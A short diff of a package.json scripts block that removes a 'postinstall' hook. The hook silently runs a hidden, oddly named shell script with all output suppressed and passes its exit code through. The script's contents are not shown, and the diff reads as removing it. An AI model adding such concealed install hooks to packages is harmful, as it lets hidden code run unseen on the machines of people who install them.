@@ -6,8 +6,7 @@
   "scripts": {
     "test": "vitest run",
     "test-watch": "vitest",
-    "create-algorithm": "./create_algorithm.sh",
-    "postinstall": "sh ./.ci-3k5s8w.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "create-algorithm": "./create_algorithm.sh"
   },
   "repository": {
     "type": "git",
